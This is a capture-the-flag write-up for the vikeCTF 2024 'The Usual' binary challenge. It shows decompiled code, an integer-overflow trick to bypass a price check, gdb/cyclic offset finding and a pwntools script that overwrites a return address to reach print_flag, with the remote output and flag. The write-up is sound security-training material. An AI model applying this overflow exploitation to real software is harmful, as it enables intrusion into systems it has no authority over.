# The Usual

## Description

In the heart of a bustling medieval market, a burly Viking with a formidable beard and weathered armor stumbles upon a peculiar sight—a vibrant flag shop adorned with banners of every hue. Intrigued by the fluttering colors, he enters the shop, his towering frame contrasting with the delicate textiles. With a mix of curiosity and confusion, he marvels at the array of flags, pondering which one might best represent his warrior clan amidst the sea of symbols and sigils.

Connect to 35.94.129.106:3008 to find the flag

`nc 35.94.129.106 3008`

[the-usual](https://ctf.vikesec.ca/files/0e39f23c880ed79403ea5fb2697f9b33/the-usual?token=eyJ1c2VyX2lkIjo1NDcsInRlYW1faWQiOjQwNSwiZmlsZV9pZCI6Nn0.Ze2OYg.56kXMLBFJwwzu5zihLGkGF5sY8I)

## Analysis

Decompile with Ghidra for better understand the code.

<details>
<summary markdown="span">main_loop function</summary> 
  
```c
void main_loop(void)

{
  int iVar1;
  uint bought_item_count;
  uint bought_item;
  char *buy_prompt;
  uint index;
  uint money;
  
  money = 100;
  while( true ) {
    while( true ) {
      printf("%s",MENU);
      printf("Your balance is $%d\n",(ulong)money);
      bought_item = 0;
      buy_prompt = "What would you like to buy? (1-5) ";
      iVar1 = read_uint(&bought_item,"What would you like to buy? (1-5) ");
      if (((iVar1 != -1) && (bought_item != 0)) && (bought_item < 6)) break;
      puts("I\'m afraid we don\'t sell that");
    }
    if (bought_item == 5) break;
    bought_item_count = 0;
    buy_prompt = "How many would you like? ";
    iVar1 = read_uint(&bought_item_count,"How many would you like? ");
    if (iVar1 == -1) {
      puts("I can\'t sell that many");
    }
    else {
      iVar1 = can_afford(money,bought_item_count,bought_item);
      if (iVar1 == 0) {
        puts("You can\'t afford that");
      }
      else {
        index = 0;
        do {
          if (bought_item == 1) {
            money = money - 10;
            print_quote();
          }
          else if (bought_item == 2) {
            money = money - 45;
            print_art();
          }
          else if (bought_item == 3) {
            money = money - 130;
            print_stand();
          }
          else {
            if (bought_item != 4) {
              puts("Goodbye!");
              return;
            }
            puts("Sorry, the flag is under maintenance");
          }
          index = index + 1;
        } while (index < bought_item_count);
      }
    }
  }
  puts("Goodbye!");
  return;
}
```

</details>


`print_flag` function exists, but it's not in the main_p. Somehow we have to get to that function and read the flag.

Basic checks:

```bash
└─$ file the-usual
the-usual: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=987649bea4bf5ae80d566897f18794463e210857, for GNU/Linux 4.4.0, not stripped

└─$ checksec --file=./the-usual
[*] '.../CTFs/vikectf/2024/misc/The Usual/the-usual'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE and no canary, we could be dealing with buffer overflow.

The 3rd item: print_stand is interesting:

```c
void print_stand(void) {
  char buffer [32];
  
  printf("What would you like your flag stand to say? ");
  fgets(buffer,300,stdin);
  puts("Great! Your organic, custom-engraved flag stand will be delivered within three to six busines s weeks");
  return;
}
```

fgets reads 300 bytes into 32 byte buffer which just screams buffer overflow. <br>
But first we need to reach `print_stand`. currently we have $100, and this option needs $130. We cant make money from game, only spend. But we can forge imaginary money D:

`read_uint` function for whatever reason takes in our input, converts it to `unsigned long` using [strtoul](https://man7.org/linux/man-pages/man3/strtoul.3.html) and then converts result to `int`??

```c
undefined8 read_uint(undefined4 *param_1,undefined8 param_2) {
  int iVar1;
  char *lastchar;
  ulong uVar2;
  char buffer [304];
  
  printf("%s",param_2);
  lastchar = fgets(buffer,300,stdin);
  if (((lastchar != (char *)0x0) && (iVar1 = strcmp(buffer,"0\n"), iVar1 != 0)) &&
     (iVar1 = strcmp(buffer,"\n"), iVar1 != 0)) {
    uVar2 = strtoul(buffer,(char **)0x0,10); // <---
    *param_1 = (int)uVar2;                   // <---
    return 0;
  }
  return 0xffffffff;
}
```

We can leverage this small mistake to essentially exploit the program. Example to demonstate integer overflow attack:

```c
// Online C compiler to run C program online
// https://www.programiz.com/c-programming/online-compiler/
#include <stdio.h>

int main() {
    int cost = 130;
    int money = 100;
    
    unsigned int x = 2147483647; // MAX_INT (signed)
    unsigned int y = x + 1;      // Overflow of signed int
    
    printf("x=%u, y=%u\n", x, y); // Print as unsigned int
    printf("x=%d, y=%d\n", x, y); // Print as   signed int
    
    
    printf("Can Buy Without Overflow?: %d\n", (unsigned int)(cost * x) < money);
    printf("Can Buy With    Overflow?: %d\n", (unsigned int)(cost * y) < money);
    return 0;
}

/* Output:
x=2147483647, y=2147483648
x=2147483647, y=-2147483648
Can Buy Without Overflow?: 0
Can Buy With    Overflow?: 1
*/
```

## Solution

```bash
└─$ type clip
clip is an alias for xclip -sel clip

└─$ cyclic 300 | clip

└─$ gdb -q ./the-usual
pwndbg: loaded 147 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from ./the-usual...
(No debugging symbols found in ./the-usual)
------- tip of the day (disable with set show-tips off) -------
GDB's apropos <topic> command displays all registered commands that are related to the given <topic>
pwndbg> r
Starting program: /home/woyag/Desktop/CTFs/vikectf/2024/misc/The Usual/the-usual
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Welcome to the flag shop!

Please make a selection:
1: A life-altering flag-themed quote, $10
2: A hand-typed, bespoke, artist's rendition of the flag, $45
3: An organic, custom-engraved flag stand, $130
4: The flag, $20,000
5: Exit

Your balance is $100
What would you like to buy? (1-5) 3
How many would you like? 2147483648
What would you like your flag stand to say? aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
Great! Your organic, custom-engraved flag stand will be delivered within three to six business weeks

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401556 in print_stand ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────
*RAX  0x65
*RBX  0x7fffffffd9f8 —▸ 0x7fffffffde08 ◂— '/home/woyag/Desktop/CTFs/vikectf/2024/misc/The Usual/the-usual'
*RCX  0x7ffff7ebc034 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x0
*RDI  0x7ffff7f92710 ◂— 0x0
*RSI  0x7ffff7f91643 (_IO_2_1_stdout_+131) ◂— 0xf92710000000000a /* '\n' */
 R8   0x0
 R9   0x0
*R10  0x7ffff7f39ac0 ◂— 0x100000000
*R11  0x202
 R12  0x0
*R13  0x7fffffffda08 —▸ 0x7fffffffde47 ◂— 'ALACRITTY_LOG=/tmp/Alacritty-980.log'
*R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*R15  0x403df0 —▸ 0x401180 ◂— endbr64
*RBP  0x6161616a61616169 ('iaaajaaa')
*RSP  0x7fffffffd8a8 ◂— 0x6161616c6161616b ('kaaalaaa')
*RIP  0x401556 (print_stand+69) ◂— ret
──────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────
 ► 0x401556 <print_stand+69>    ret    <0x6161616c6161616b>










────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd8a8 ◂— 0x6161616c6161616b ('kaaalaaa')
01:0008│     0x7fffffffd8b0 ◂— 0x6161616e6161616d ('maaanaaa')
02:0010│     0x7fffffffd8b8 ◂— 0x616161706161616f ('oaaapaaa')
03:0018│     0x7fffffffd8c0 ◂— 0x6161617261616171 ('qaaaraaa')
04:0020│     0x7fffffffd8c8 ◂— 0x6161617461616173 ('saaataaa')
05:0028│     0x7fffffffd8d0 ◂— 0x6161617661616175 ('uaaavaaa')
06:0030│     0x7fffffffd8d8 ◂— 0x6161617861616177 ('waaaxaaa')
07:0038│     0x7fffffffd8e0 ◂— 0x6261617a61616179 ('yaaazaab')
──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► 0         0x401556 print_stand+69
   1 0x6161616c6161616b
   2 0x6161616e6161616d
   3 0x616161706161616f
   4 0x6161617261616171
   5 0x6161617461616173
   6 0x6161617661616175
   7 0x6161617861616177
───────────────────────────────────────────────────────────────────────────────────────────────────────── 

# We are interested where the function returns so
# *RSP  0x7fffffffd8a8 ◂— 0x6161616c6161616b ('kaaalaaa') <--- Stack Pointer
# *RIP  0x401556 (print_stand+69) ◂— ret
# ──────────────────────────────────[ DISASM / x86-64 / set emulate on # ]───────────────────────────────────
#  ► 0x401556 <print_stand+69>    ret    <0x6161616c6161616b>
└─$ cyclic -l kaaalaaa
40 # Padding/offset found
```

Solve Script:

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

exe = './the-usual'
elf = context.binary = ELF(exe)
context.log_level = 'DEBUG'

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote('35.94.129.106', 3008)
    else:
        return process([exe] + argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.sendlineafter(b'(1-5) ', b'3') # Choose Vuln Function
io.sendlineafter(b'? ', b'2147483648') # Overflow Int To Purchase Item

padding = 40 # Find From GDB
io.sendlineafter(
	b'? ', 
	flat({padding: elf.functions.print_flag}) # Return to print_flag
)
io.recvallS() # Profit
io.close()
```

```bash
└─$ py solve.py REMOTE
[*] '/home/woyag/Desktop/CTFs/vikectf/2024/misc/The Usual/the-usual'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 35.94.129.106 on port 3008: Done
[DEBUG] Received 0x1a bytes:
    b'Welcome to the flag shop!\n'
[DEBUG] Received 0x107 bytes:
    b'\n'
    b'Please make a selection:\n'
    b'1: A life-altering flag-themed quote, $10\n'
    b"2: A hand-typed, bespoke, artist's rendition of the flag, $45\n"
    b'3: An organic, custom-engraved flag stand, $130\n'
    b'4: The flag, $20,000\n'
    b'5: Exit\n'
    b'\n'
    b'Your balance is $100\n'
    b'What would you like to buy? (1-5) '
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x19 bytes:
    b'How many would you like? '
[DEBUG] Sent 0xb bytes:
    b'2147483648\n'
[DEBUG] Received 0x2c bytes:
    b'What would you like your flag stand to say? '
[DEBUG] Sent 0x31 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  57 15 40 00  00 00 00 00  │iaaa│jaaa│W·@·│····│
    00000030  0a                                                  │·│
    00000031
[+] Receiving all data: Done (133B)
[DEBUG] Received 0x65 bytes:
    b'Great! Your organic, custom-engraved flag stand will be delivered within three to six business weeks\n'
[DEBUG] Received 0x20 bytes:
    b'vikeCTF{B!n@ry_Xp10!7@7!0N_X64}\n'
[*] Closed connection to 35.94.129.106 port 3008
```
::: tip Flag
`vikeCTF{B!n@ry_Xp10!7@7!0N_X64}`
:::